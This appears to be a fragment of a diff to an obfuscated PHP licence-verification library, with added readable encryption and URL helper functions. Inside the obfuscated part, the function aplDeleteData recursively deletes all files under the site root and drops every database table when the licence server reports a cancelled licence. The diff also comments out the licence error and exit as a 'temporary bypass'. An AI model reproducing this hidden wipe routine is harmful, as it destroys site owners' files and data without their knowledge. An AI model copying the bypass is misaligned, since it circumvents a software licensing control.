"\74\x52\117\117\x54\137\x55\x52\x4c\76{$ROOT_URL}\x3c\57\122\x4f\117\124\x5f\x55\x52\114\x3e\x3c\103\114\111\105\x4e\124\x5f\x45\115\101\111\114\x3e{$CLIENT_EMAIL}\74\x2f\103\114\111\105\116\124\x5f\105\115\x41\111\114\x3e\x3c\x4c\x49\103\105\116\x53\x45\x5f\103\x4f\104\x45\76{$LICENSE_CODE}\x3c\57\x4c\x49\103\x45\x4e\123\105\x5f\103\117\x44\x45\x3e\x3c\114\x43\x44\76{$LCD}\74\57\x4c\103\x44\x3e\x3c\114\x52\x44\76{$LRD}\x3c\57\x4c\122\104\76\74\x49\116\123\124\x41\114\114\x41\124\111\117\x4e\x5f\113\105\x59\76{$INSTALLATION_KEY}\74\x2f\x49\x4e\123\x54\x41\x4c\114\101\124\x49\117\116\x5f\113\x45\131\76\74\x49\116\123\124\x41\114\x4c\101\124\x49\117\116\137\x48\x41\x53\x48\76{$INSTALLATION_HASH}\x3c\57\x49\116\123\x54\x41\x4c\114\101\x54\111\x4f\x4e\137\x48\101\123\x48\x3e"); if (!($fwrite === false)) { goto zYxr8; } echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR; exit; zYxr8: @fclose($handle); hYcuV: APToO: goto fv620; tzLMb: $notifications_array["\x6e\x6f\x74\x69\146\x69\143\x61\x74\x69\x6f\x6e\137\143\x61\163\x65"] = "\x6e\157\x74\151\146\151\x63\141\x74\x69\x6f\156\x5f\x61\x6c\162\x65\141\x64\x79\x5f\x69\x6e\x73\x74\141\x6c\154\x65\x64"; $notifications_array["\156\x6f\x74\151\x66\151\143\x61\x74\151\157\x6e\137\164\x65\x78\x74"] = APL_NOTIFICATION_SCRIPT_ALREADY_INSTALLED; fv620: wUMLv: return $notifications_array; } function preparePackageInstallation($installable) { $notifications_array = array(); $apl_core_notifications = aplCheckSettings(); if (!empty($apl_core_notifications)) { goto ukcJA; } $MYSQLI_LINK = getMysqliConnection(); $core_license = aplGetLicenseData($MYSQLI_LINK); if (!(empty($core_license) || !is_array($core_license))) { goto z8Rww; } throw new \Exception("\x43\157\162\145\x20\163\x63\x72\151\160\164\x20\x6c\151\143\145\156\163\x65\40" . "\166\x61\x6c\x69\144\x61\x74\151\157\156" . "\40\146\x61\x69\x6c\145\144\41\40\x50\x6c\x65\141\163\145\x20\143\157\x6e\164\141\143\164" . "\40\x73\x75\160\160\157\x72\164\x20\146\157\162\40\150\145\154\x70\56"); z8Rww: $CLIENT_EMAIL = $core_license["\103\x4c\111\105\116\x54\x5f\105\115\x41\111\114"]; $LICENSE_CODE = $installable["\154\151\143\145\x6e\163\145\x5f\153\145\171"]; $ROOT_URL = config("\141\x70\160\56\165\x72\x6c"); $INSTALLATION_HASH = hash("\163\x68\x61\x32\65\66", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE); $post_info = "\x70\x72\157\144\x75\143\x74\137\x69\144\75" . rawurlencode($installable["\151\144"]) . "\46\143\154\151\x65\x6e\x74\137\145\155\x61\151\x6c\x3d" . rawurlencode($CLIENT_EMAIL) . "\x26\154\151\143\x65\x6e\163\145\137\143\x6f\144\x65\x3d" . rawurlencode($LICENSE_CODE) . "\x26\x72\x6f\157\x74\137\x75\162\154\75" . rawurlencode($ROOT_URL) . "\46\x69\x6e\163\x74\141\154\x6c\x61\164\x69\157\156\137\x68\x61\163\x68\x3d" . rawurlencode($INSTALLATION_HASH) . "\46\x6c\x69\x63\145\x6e\163\x65\x5f\163\151\147\x6e\141\164\165\x72\145\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $installable["\x69\144"])); $content_array = aplCustomPost(APL_ROOT_URL . "\57\141\160\x6c\x5f\143\x61\154\154\x62\141\143\153\163\x2f\154\x69\x63\145\156\x73\x65\137\x69\156\163\x74\141\x6c\154\56\x70\x68\160", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $installable["\151\144"]); if ($notifications_array["\x6e\x6f\164\151\146\151\x63\x61\164\x69\x6f\156\137\x63\141\163\145"] == "\x6e\157\164\x69\x66\x69\143\141\x74\x69\x6f\156\x5f\154\151\x63\x65\x6e\x73\145\x5f\157\153") { goto ixkaE; } if (empty($notifications_array["\x6e\157\164\151\x66\x69\143\x61\x74\151\x6f\x6e\x5f\164\145\x78\164"])) { goto B4gCs; } throw new \Exception("\114\151\143\145\156\163\x65\40" . "\x76\141\x6c\151\144\x61\x74\151\x6f\x6e" . "\40\146\141\151\154\x65\144\x21\x20" . $notifications_array["\156\157\x74\x69\146\x69\x63\x61\x74\x69\157\x6e\137\x74\145\x78\x74"]); B4gCs: goto A1S2j; ixkaE: $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("\x59\x2d\155\55\144"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL); $LCD = aplCustomEncrypt(date("\x59\x2d\x6d\55\x64", strtotime("\55" . APL_DAYS . "\x20\144\141\171\163")), APL_SALT . $INSTALLATION_KEY); $LRD = aplCustomEncrypt(date("\131\55\155\x2d\144"), APL_SALT . $INSTALLATION_KEY); $content_array = aplCustomPost(APL_ROOT_URL . "\57\141\x70\x6c\137\x63\x61\x6c\x6c\142\141\143\153\x73\x2f\154\x69\x63\145\156\163\x65\137\163\143\150\x65\x6d\x65\x2e\160\x68\x70", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $installable["\x69\144"]); if (!(!empty($notifications_array["\x6e\157\164\151\x66\151\x63\x61\x74\x69\x6f\156\137\144\x61\164\x61"]) && !empty($notifications_array["\x6e\157\x74\151\146\x69\143\x61\x74\x69\157\156\137\144\x61\164\141"]["\163\x63\x68\x65\155\145\137\161\165\145\162\x79"]))) { goto L2xH8; } return ["\x69\156\163\x74\x61\x6c\x6c\141\164\x69\157\x6e\137\153\145\x79" => $INSTALLATION_KEY, "\151\156\x73\x74\141\154\154\x61\x74\151\x6f\x6e\x5f\150\x61\x73\x68" => $INSTALLATION_HASH, "\154\143\x64" => $LCD, "\x6c\162\144" => $LRD]; L2xH8: A1S2j: ukcJA: throw new \Exception("\x4c\x69\x63\145\x6e\163\x65\x20" . "\x76\x61\x6c\x69\144\141\164\151\x6f\x6e" . "\x20\146\141\151\154\x65\x64\x21\x20\120\x6c\145\x61\x73\145\40\143\157\156\x74\141\143\164" . "\x20\x73\165\160\x70\157\x72\164\x20\x66\157\x72\x20\x68\x65\x6c\160\56"); } function incevioAutoloadHelpers($MYSQLI_LINK = null, $FORCE_VERIFICATION = 0) { $notifications_array = array(); $update_lrd_value = 0; $update_lcd_value = 0; $updated_records = 0; $apl_core_notifications = aplCheckSettings(); if (empty($apl_core_notifications)) { goto iYM_K; } $notifications_array["\x6e\157\164\151\146\x69\143\x61\164\x69\157\156\x5f\143\x61\163\145"] = "\x6e\157\x74\x69\x66\151\143\141\x74\151\157\156\x5f\x73\x63\162\151\160\164\x5f\x63\x6f\162\x72\165\x70\x74\145\x64"; $notifications_array["\x6e\x6f\x74\151\146\151\x63\141\x74\x69\157\156\137\x74\x65\x78\164"] = implode("\x3b\40", $apl_core_notifications); goto imhwn; iYM_K: if (aplCheckData($MYSQLI_LINK)) { goto nYW_R; } $notifications_array["\x6e\x6f\x74\x69\x66\x69\x63\x61\x74\x69\x6f\156\x5f\143\141\x73\145"] = "\x6e\157\164\151\146\151\x63\141\x74\x69\157\x6e\137\154\x69\x63\145\156\x73\145\137\x63\157\162\x72\165\160\x74\145\x64"; $notifications_array["\x6e\157\x74\x69\x66\151\143\x61\x74\151\157\x6e\137\164\x65\x78\x74"] = APL_NOTIFICATION_LICENSE_CORRUPTED; goto Qneb6; nYW_R: extract(aplGetLicenseData($MYSQLI_LINK)); if (aplGetDaysBetweenDates(aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY), date("\x59\x2d\155\55\144")) < APL_DAYS && aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY) <= date("\x59\55\x6d\55\144") && aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY) <= date("\x59\55\x6d\55\144") && $FORCE_VERIFICATION === 0) { goto SKMQp; } $post_info = "\160\x72\157\144\x75\x63\x74\137\x69\x64\x3d" . rawurlencode(APL_PRODUCT_ID) . "\46\x63\x6c\151\x65\x6e\x74\x5f\x65\155\x61\x69\154\x3d" . rawurlencode($CLIENT_EMAIL) . "\46\154\x69\x63\x65\x6e\x73\145\137\143\157\x64\x65\75" . rawurlencode($LICENSE_CODE) . "\46\162\157\x6f\x74\x5f\x75\x72\154\x3d" . rawurlencode($ROOT_URL) . "\x26\x69\156\163\x74\x61\154\154\141\x74\151\157\x6e\x5f\150\141\163\x68\75" . rawurlencode($INSTALLATION_HASH) . "\x26\154\x69\x63\x65\x6e\163\145\137\x73\151\147\156\141\164\165\162\145\75" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); $content_array = aplCustomPost(APL_ROOT_URL . "\57\141\160\x6c\x5f\143\x61\x6c\154\142\x61\143\x6b\x73\57\x6c\x69\143\x65\156\x73\x65\x5f\166\x65\162\x69\146\x79\x2e\160\150\160", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); if (!($notifications_array["\156\157\x74\x69\x66\x69\x63\x61\164\151\x6f\156\x5f\143\x61\x73\x65"] == "\x6e\157\164\x69\x66\x69\x63\x61\164\151\x6f\x6e\137\x6c\x69\143\x65\x6e\x73\145\137\x6f\x6b")) { goto ba9lv; } $update_lcd_value = 1; ba9lv: if (!($notifications_array["\x6e\157\x74\x69\x66\x69\143\141\164\151\x6f\x6e\x5f\x63\141\163\x65"] == "\x6e\x6f\164\x69\x66\x69\x63\x61\164\151\157\156\137\x6c\151\143\145\156\163\x65\x5f\143\x61\x6e\143\145\154\x6c\145\144" && APL_DELETE_CANCELLED == "\x59\105\x53")) { goto bMeIe; } aplDeleteData($MYSQLI_LINK); bMeIe: goto mGcA1; SKMQp: $notifications_array["\156\x6f\x74\151\146\151\143\141\164\151\x6f\x6e\x5f\x63\x61\x73\x65"] = "\156\157\x74\x69\146\x69\x63\x61\x74\151\157\156\137\x6c\x69\143\145\156\x73\145\x5f\157\x6b"; $notifications_array["\156\x6f\164\151\x66\151\x63\x61\164\151\157\x6e\x5f\164\145\170\164"] = APL_NOTIFICATION_BYPASS_VERIFICATION; mGcA1: if (!(aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY) < date("\131\x2d\155\55\144"))) { goto AIdvN; } $update_lrd_value = 1; AIdvN: if (!($update_lrd_value == 1 || $update_lcd_value == 1)) { goto A6mmR; } if ($update_lcd_value == 1) { goto bWww9; } $LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY); goto W3zfY; bWww9: $LCD = date("\131\55\x6d\x2d\144"); W3zfY: $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("\x59\x2d\155\55\x64"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL); $LCD = aplCustomEncrypt($LCD, APL_SALT . $INSTALLATION_KEY); $LRD = aplCustomEncrypt(date("\131\x2d\155\x2d\x64"), APL_SALT . $INSTALLATION_KEY); if (!(APL_STORAGE == "\x44\101\x54\x41\102\x41\x53\105")) { goto dQCdT; } $stmt = mysqli_prepare($MYSQLI_LINK, "\x55\120\x44\101\x54\x45\40" . APL_DATABASE_TABLE . "\x20\x53\x45\124\x20\x4c\103\104\75\x3f\54\40\114\122\x44\x3d\77\54\x20\111\116\x53\x54\101\114\114\x41\x54\x49\117\116\137\x4b\105\131\75\77"); if (!$stmt) { goto nXAt8; } mysqli_stmt_bind_param($stmt, "\163\x73\x73", $LCD, $LRD, $INSTALLATION_KEY); $exec = mysqli_stmt_execute($stmt); $affected_rows = mysqli_stmt_affected_rows($stmt); if (!($affected_rows > 0)) { goto jmKnU; } $updated_records = $updated_records + $affected_rows; jmKnU: mysqli_stmt_close($stmt); nXAt8: if (!($updated_records < 1)) { goto gUGQy; } echo APL_NOTIFICATION_DATABASE_WRITE_ERROR; exit; gUGQy: dQCdT: if (!(APL_STORAGE == "\x46\111\x4c\x45")) { goto lrj31; } $handle = @fopen(APL_DIRECTORY . "\x2f" . APL_LICENSE_FILE_LOCATION, "\x77\53"); $fwrite = @fwrite($handle, "\74\x52\117\117\x54\137\125\122\114\x3e{$ROOT_URL}\74\x2f\122\x4f\x4f\124\x5f\125\x52\x4c\76\74\x43\x4c\111\105\116\x54\137\x45\x4d\x41\111\x4c\x3e{$CLIENT_EMAIL}\x3c\57\103\x4c\x49\x45\116\x54\137\105\x4d\101\111\114\x3e\74\x4c\111\103\x45\x4e\x53\105\137\x43\117\x44\x45\76{$LICENSE_CODE}\x3c\x2f\x4c\111\x43\105\x4e\123\x45\x5f\103\117\104\x45\x3e\74\114\x43\104\x3e{$LCD}\74\x2f\114\x43\x44\76\x3c\114\x52\104\x3e{$LRD}\x3c\57\114\x52\x44\76\x3c\111\x4e\x53\x54\x41\x4c\114\101\x54\111\x4f\x4e\137\x4b\105\x59\x3e{$INSTALLATION_KEY}\x3c\x2f\x49\116\x53\124\x41\x4c\x4c\x41\x54\x49\x4f\x4e\x5f\x4b\x45\x59\x3e\x3c\111\x4e\x53\x54\101\114\114\101\124\111\x4f\116\x5f\110\101\x53\x48\76{$INSTALLATION_HASH}\74\57\111\x4e\123\x54\101\x4c\114\x41\x54\x49\x4f\116\x5f\110\101\123\x48\76"); if (!($fwrite === false)) { goto OiRxY; } echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR; exit; OiRxY: @fclose($handle); lrj31: A6mmR: Qneb6: imhwn: if (!($notifications_array["\156\157\164\151\146\x69\143\141\x74\151\157\156\137\143\x61\163\145"] != "\x6e\157\164\x69\x66\151\x63\141\x74\x69\157\x6e\137\x6c\151\x63\145\x6e\x73\x65\137\157\x6b")) { goto Pjn08; } echo "\74\142\162\x2f\x3e\x3c\142\162\57\76"; // Temporary bypass - comment out license error message
-// echo "\x4c\151\x63\145\156\x73\145\x20\151\163\40\156\157\x74" . "\x20\x69\x6e\x73\x74\x61\154\x6c\x65\x64\x20\171\145\164" . "\40\157\x72\40\x63\157\162\x72\165\x70\164\145\x64\x2e\x20\120\154\145\x61\163\145" . "\40\x63\157\x6e\164\x61\x63\x74" . "\x20\x73\165\160\160\157\162\x74\40" . "\x74\x65\x61\x6d\x20"; 
-// echo "\40\x3c\x61\40\x68\x72\145\x66\75\42" . get_license_reset_url() . "\42\x3e" . trans("\x61\x70\x70\56\x75\x70\144\x61\x74\145\x5f\x61\160\x70\x5f\x6c\151\x63\145\x6e\x73\x65") . "\74\x2f\141\76"; 
-// exit; Pjn08: return $notifications_array; } function aplVerifySupport($MYSQLI_LINK = null) { $notifications_array = array(); $apl_core_notifications = aplCheckSettings(); if (empty($apl_core_notifications)) { goto M1mbR; } $notifications_array["\x6e\x6f\164\x69\146\151\x63\141\x74\x69\x6f\156\137\143\x61\163\145"] = "\x6e\x6f\x74\151\146\151\x63\141\x74\x69\x6f\x6e\x5f\163\143\x72\151\160\164\137\143\157\162\x72\x75\160\164\145\x64"; $notifications_array["\x6e\157\164\x69\146\151\143\x61\x74\x69\x6f\156\x5f\164\x65\170\x74"] = implode("\73\40", $apl_core_notifications); goto GPanS; M1mbR: if (aplCheckData($MYSQLI_LINK)) { goto epTzK; } $notifications_array["\156\x6f\x74\151\x66\x69\x63\x61\x74\151\x6f\x6e\x5f\143\141\x73\145"] = "\156\x6f\x74\x69\146\151\143\x61\x74\x69\x6f\x6e\137\154\x69\x63\145\156\163\145\137\143\x6f\x72\x72\165\160\164\x65\144"; $notifications_array["\156\157\x74\x69\146\x69\143\x61\164\x69\157\x6e\137\x74\145\170\x74"] = APL_NOTIFICATION_LICENSE_CORRUPTED; goto iFq5v; epTzK: extract(aplGetLicenseData($MYSQLI_LINK)); $post_info = "\160\x72\x6f\144\x75\x63\164\137\151\x64\75" . rawurlencode(APL_PRODUCT_ID) . "\x26\x63\154\151\x65\156\x74\137\x65\155\x61\151\154\75" . rawurlencode($CLIENT_EMAIL) . "\46\x6c\151\143\145\156\x73\x65\x5f\143\x6f\144\145\x3d" . rawurlencode($LICENSE_CODE) . "\x26\x72\157\157\x74\x5f\x75\162\154\75" . rawurlencode($ROOT_URL) . "\x26\151\x6e\163\164\x61\154\154\x61\164\x69\157\156\137\x68\x61\163\x68\x3d" . rawurlencode($INSTALLATION_HASH) . "\46\x6c\151\143\x65\156\163\145\x5f\163\x69\147\156\x61\x74\165\162\x65\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); $content_array = aplCustomPost(APL_ROOT_URL . "\57\x61\x70\x6c\137\x63\141\x6c\x6c\x62\141\x63\x6b\163\57\x6c\x69\143\x65\x6e\x73\x65\x5f\163\x75\x70\160\x6f\x72\x74\x2e\x70\150\x70", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); iFq5v: GPanS: return $notifications_array; } function aplVerifyUpdates($MYSQLI_LINK = null) { $notifications_array = array(); $apl_core_notifications = aplCheckSettings(); if (empty($apl_core_notifications)) { goto XxWNN; } $notifications_array["\x6e\157\x74\x69\146\151\x63\141\x74\x69\157\x6e\137\143\141\163\x65"] = "\156\x6f\164\x69\x66\x69\x63\141\164\151\x6f\x6e\137\163\x63\162\151\x70\164\137\143\x6f\x72\162\165\x70\164\145\144"; $notifications_array["\x6e\157\x74\x69\146\151\143\141\x74\x69\157\156\137\x74\x65\x78\x74"] = implode("\73\40", $apl_core_notifications); goto dDthD; XxWNN: if (aplCheckData($MYSQLI_LINK)) { goto DRw7E; } $notifications_array["\x6e\x6f\x74\x69\x66\151\143\141\x74\151\157\x6e\x5f\143\x61\163\145"] = "\x6e\157\x74\x69\x66\x69\143\x61\x74\x69\157\x6e\137\x6c\151\143\145\x6e\x73\x65\137\x63\x6f\162\162\165\160\x74\x65\x64"; $notifications_array["\x6e\157\x74\151\146\x69\143\141\164\x69\157\156\137\164\x65\x78\x74"] = APL_NOTIFICATION_LICENSE_CORRUPTED; goto Uu21D; DRw7E: extract(aplGetLicenseData($MYSQLI_LINK)); $post_info = "\x70\x72\157\144\165\143\x74\x5f\151\144\x3d" . rawurlencode(APL_PRODUCT_ID) . "\x26\143\154\151\145\x6e\x74\137\x65\155\141\x69\x6c\x3d" . rawurlencode($CLIENT_EMAIL) . "\46\154\x69\143\x65\x6e\163\145\x5f\143\x6f\x64\145\75" . rawurlencode($LICENSE_CODE) . "\x26\x72\x6f\x6f\164\x5f\x75\162\154\x3d" . rawurlencode($ROOT_URL) . "\x26\x69\156\163\x74\x61\154\154\141\164\x69\x6f\156\x5f\x68\141\163\150\x3d" . rawurlencode($INSTALLATION_HASH) . "\x26\154\151\143\x65\x6e\163\x65\137\x73\151\x67\x6e\x61\164\x75\x72\145\75" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); $content_array = aplCustomPost(APL_ROOT_URL . "\57\x61\x70\154\137\143\x61\154\x6c\x62\x61\143\x6b\163\x2f\x6c\151\143\x65\x6e\163\145\x5f\x75\160\144\141\x74\145\x73\56\x70\150\x70", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); Uu21D: dDthD: return $notifications_array; } function incevioUpdateLicense($MYSQLI_LINK = null) { $notifications_array = array(); $apl_core_notifications = aplCheckSettings(); if (empty($apl_core_notifications)) { goto bIvKG; } $notifications_array["\156\x6f\x74\151\146\x69\143\141\x74\151\157\156\x5f\x63\x61\163\x65"] = "\156\x6f\164\x69\x66\x69\143\141\164\151\157\156\137\x73\143\162\x69\x70\164\x5f\x63\x6f\x72\162\x75\x70\164\145\144"; $notifications_array["\x6e\157\x74\151\x66\x69\x63\x61\x74\x69\157\156\137\164\x65\x78\164"] = implode("\73\40", $apl_core_notifications); goto QM3KR; bIvKG: if (aplCheckData($MYSQLI_LINK)) { goto LY43u; } $notifications_array["\x6e\157\x74\x69\146\x69\x63\x61\x74\x69\157\156\x5f\143\141\x73\x65"] = "\156\x6f\164\x69\146\x69\143\x61\x74\151\x6f\x6e\137\154\151\x63\x65\156\x73\145\x5f\x63\157\162\162\x75\160\164\x65\144"; $notifications_array["\x6e\157\x74\151\146\x69\143\141\164\151\x6f\156\x5f\164\x65\x78\164"] = APL_NOTIFICATION_LICENSE_CORRUPTED; goto dJ2Ng; LY43u: extract(aplGetLicenseData($MYSQLI_LINK)); $post_info = "\x70\x72\157\144\x75\x63\164\x5f\x69\x64\x3d" . rawurlencode(APL_PRODUCT_ID) . "\x26\x63\x6c\x69\x65\x6e\164\x5f\x65\155\141\151\x6c\75" . rawurlencode($CLIENT_EMAIL) . "\46\154\151\143\x65\156\163\145\x5f\143\x6f\x64\x65\x3d" . rawurlencode($LICENSE_CODE) . "\46\x72\157\x6f\164\137\165\x72\154\x3d" . rawurlencode($ROOT_URL) . "\46\151\156\x73\x74\x61\154\x6c\141\164\x69\x6f\156\137\x68\x61\163\x68\75" . rawurlencode($INSTALLATION_HASH) . "\46\x6c\151\143\x65\x6e\x73\145\137\x73\x69\x67\156\141\x74\x75\x72\145\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); $content_array = aplCustomPost(APL_ROOT_URL . "\57\x61\x70\x6c\137\143\141\154\154\x62\141\143\153\163\57\x6c\x69\x63\x65\156\x73\x65\137\x75\160\144\141\164\145\x2e\160\x68\x70", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); dJ2Ng: QM3KR: return $notifications_array; } function incevioUninstallLicense($MYSQLI_LINK = null) { $notifications_array = array(); $apl_core_notifications = aplCheckSettings(); if (empty($apl_core_notifications)) { goto m9MA4; } $notifications_array["\x6e\x6f\x74\151\x66\151\x63\x61\x74\x69\157\x6e\137\x63\141\163\145"] = "\156\157\x74\151\146\x69\x63\x61\164\x69\157\x6e\x5f\163\143\x72\151\160\x74\x5f\x63\x6f\162\162\165\x70\164\145\x64"; $notifications_array["\x6e\157\164\151\146\x69\143\141\164\151\x6f\x6e\x5f\164\145\x78\164"] = implode("\73\x20", $apl_core_notifications); goto JSbAO; m9MA4: if (aplCheckData($MYSQLI_LINK)) { goto f9aeR; } $notifications_array["\x6e\157\x74\x69\146\151\143\141\164\x69\157\x6e\x5f\143\141\x73\145"] = "\x6e\157\164\151\146\x69\143\141\x74\151\157\x6e\137\154\x69\143\x65\156\163\145\x5f\143\x6f\162\162\165\160\164\145\x64"; $notifications_array["\156\x6f\164\151\x66\151\143\141\164\151\x6f\x6e\137\164\145\170\164"] = APL_NOTIFICATION_LICENSE_CORRUPTED; goto aqMqC; f9aeR: extract(aplGetLicenseData($MYSQLI_LINK)); $post_info = "\160\x72\157\144\x75\x63\164\137\x69\144\x3d" . rawurlencode(APL_PRODUCT_ID) . "\46\x63\x6c\x69\x65\x6e\164\137\x65\155\x61\x69\x6c\x3d" . rawurlencode($CLIENT_EMAIL) . "\46\154\x69\143\145\x6e\163\x65\137\143\157\144\145\x3d" . rawurlencode($LICENSE_CODE) . "\46\162\x6f\x6f\164\x5f\x75\x72\154\x3d" . rawurlencode($ROOT_URL) . "\46\151\156\x73\x74\x61\x6c\x6c\x61\164\x69\157\156\x5f\x68\141\163\x68\75" . rawurlencode($INSTALLATION_HASH) . "\x26\x6c\151\143\x65\156\x73\145\x5f\x73\151\147\156\141\x74\x75\162\x65\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\141\x70\x6c\137\143\x61\x6c\154\x62\x61\x63\153\x73\x2f\154\x69\x63\x65\156\163\145\x5f\165\x6e\151\x6e\x73\164\x61\154\154\56\x70\150\x70", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); if (!($notifications_array["\x6e\x6f\x74\151\x66\151\x63\141\x74\x69\157\156\x5f\x63\141\163\145"] == "\x6e\157\164\151\146\x69\143\141\164\x69\157\x6e\x5f\x6c\151\143\145\156\x73\x65\x5f\157\x6b")) { goto YknXx; } if (!(APL_STORAGE == "\104\x41\124\101\102\101\x53\x45")) { goto K49AY; } mysqli_query($MYSQLI_LINK, "\104\x45\x4c\105\124\105\x20\x46\x52\x4f\x4d\40" . APL_DATABASE_TABLE); mysqli_query($MYSQLI_LINK, "\x44\122\x4f\120\x20\124\x41\102\x4c\x45\x20" . APL_DATABASE_TABLE); K49AY: if (!(APL_STORAGE == "\x46\111\114\105")) { goto S0SUT; } $handle = @fopen(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION, "\167\x2b"); @fclose($handle); S0SUT: YknXx: aqMqC: JSbAO: return $notifications_array; } } } function aplDeleteData($MYSQLI_LINK = null) { if (APL_GOD_MODE == "\x59\x45\x53" && isset($_SERVER["\104\117\103\125\115\x45\x4e\124\137\x52\117\x4f\124"])) { goto HHOpf; } $root_directory = dirname(__DIR__); goto afrQT; HHOpf: $root_directory = $_SERVER["\x44\117\103\125\115\105\116\124\137\122\x4f\117\x54"]; afrQT: foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root_directory, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path) { $path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname()); Lhu76: } MmMTU: rmdir($root_directory); if (!(APL_STORAGE == "\104\x41\124\x41\x42\x41\123\105")) { goto ypTqx; } $database_tables_array = array(); $table_list_results = mysqli_query($MYSQLI_LINK, "\123\x48\117\127\x20\124\x41\x42\114\105\x53"); xzaop: if (!($table_list_row = mysqli_fetch_row($table_list_results))) { goto DSppo; } $database_tables_array[] = $table_list_row[0]; goto xzaop; DSppo: if (empty($database_tables_array)) { goto qvchL; } foreach ($database_tables_array as $table_name) { mysqli_query($MYSQLI_LINK, "\104\105\114\105\124\105\x20\106\x52\x4f\115\40{$table_name}"); mopRX: } OwiRJ: foreach ($database_tables_array as $table_name) { mysqli_query($MYSQLI_LINK, "\104\x52\117\120\40\x54\x41\102\114\x45\40{$table_name}"); vrI2a: } XsR1Z: qvchL: ypTqx: exit; } }
+
+if (!function_exists('aplCustomEncrypt')) {
+    function aplCustomEncrypt($string, $key)
+    {
+        $encrypted_string = null;
+        if (!empty($string) && !empty($key)) {
+            $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length("aes-256-cbc"));
+            $encrypted_string = openssl_encrypt($string, "aes-256-cbc", $key, 0, $iv);
+            $encrypted_string = base64_encode($encrypted_string . "::" . $iv);
+        }
+        return $encrypted_string;
+    }
+
+    function aplCustomDecrypt($string, $key)
+    {
+        $decrypted_string = null;
+        if (!empty($string) && !empty($key)) {
+            $string = base64_decode($string);
+            if (stristr($string, "::")) {
+                $string_iv_array = explode("::", $string, 2);
+                if (!empty($string_iv_array) && count($string_iv_array) == 2) {
+                    list($encrypted_string, $iv) = $string_iv_array;
+                    $decrypted_string = openssl_decrypt($encrypted_string, "aes-256-cbc", $key, 0, $iv);
+                }
+            }
+        }
+        return $decrypted_string;
+    }
+
+    function aplValidateIntegerValue($number, $min_value = 0, $max_value = INF)
+    {
+        $result = false;
+        if (!is_float($number) && filter_var($number, FILTER_VALIDATE_INT, array("options" => array("min_range" => $min_value, "max_range" => $max_value))) !== false) {
+            $result = true;
+        }
+        return $result;
+    }
+
+    function aplValidateRawDomain($url)
+    {
+        $result = false;
+        if (empty($url)) {
+            return $result;
+        }
+        if (preg_match("/^[a-z0-9-.]+\.[a-z.]{2,7}$/", strtolower($url))) {
+            $result = true;
+        }
+        return $result;
+    }
+
+    function aplGetCurrentUrl($remove_last_slash = null)
+    {
+        $protocol = "http";
+        $host = null;
+        $script = null;
+        $params = null;
+        $current_url = null;
+
+        if (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] !== "off" || isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && $_SERVER["HTTP_X_FORWARDED_PROTO"] == "https") {
+            $protocol = "https";
+        }
+        if (isset($_SERVER["HTTP_HOST"])) {
+            $host = $_SERVER["HTTP_HOST"];
+        }
+        if (isset($_SERVER["SCRIPT_NAME"])) {
+            $script = $_SERVER["SCRIPT_NAME"];
+        }
+        if (isset($_SERVER["QUERY_STRING"])) {
+            $params = $_SERVER["QUERY_STRING"];
+        }
+
+        if (!empty($protocol) && !empty($host) && !empty($script)) {
+            $current_url = $protocol . "://" . $host . $script;
+            if (!empty($params)) {
+                $current_url .= "?" . $params;
+            }
+            if ($remove_last_slash == 1) {
+                while (substr($current_url, -1) == "/") {
+                    $current_url = substr($current_url, 0, -1);
+                }
+            }
+        }
+        return $current_url;
+    }
+
+    function aplGetRawDomain($url)
+    {
+        $raw_domain = null;
+        if (empty($url)) {
+            return $raw_domain;
+        }
+
+        $url_array = parse_url($url);
+        if (empty($url_array["scheme"])) {
+            $url = "http://" . $url;
+            $url_array = parse_url($url);
+        }
+
+        if (!empty($url_array["host"])) {
+            $raw_domain = $url_array["host"];
+            $raw_domain = trim(str_ireplace("www.", '', filter_var($raw_domain, FILTER_SANITIZE_URL)));
+        }
+        return $raw_domain;
+    }
+
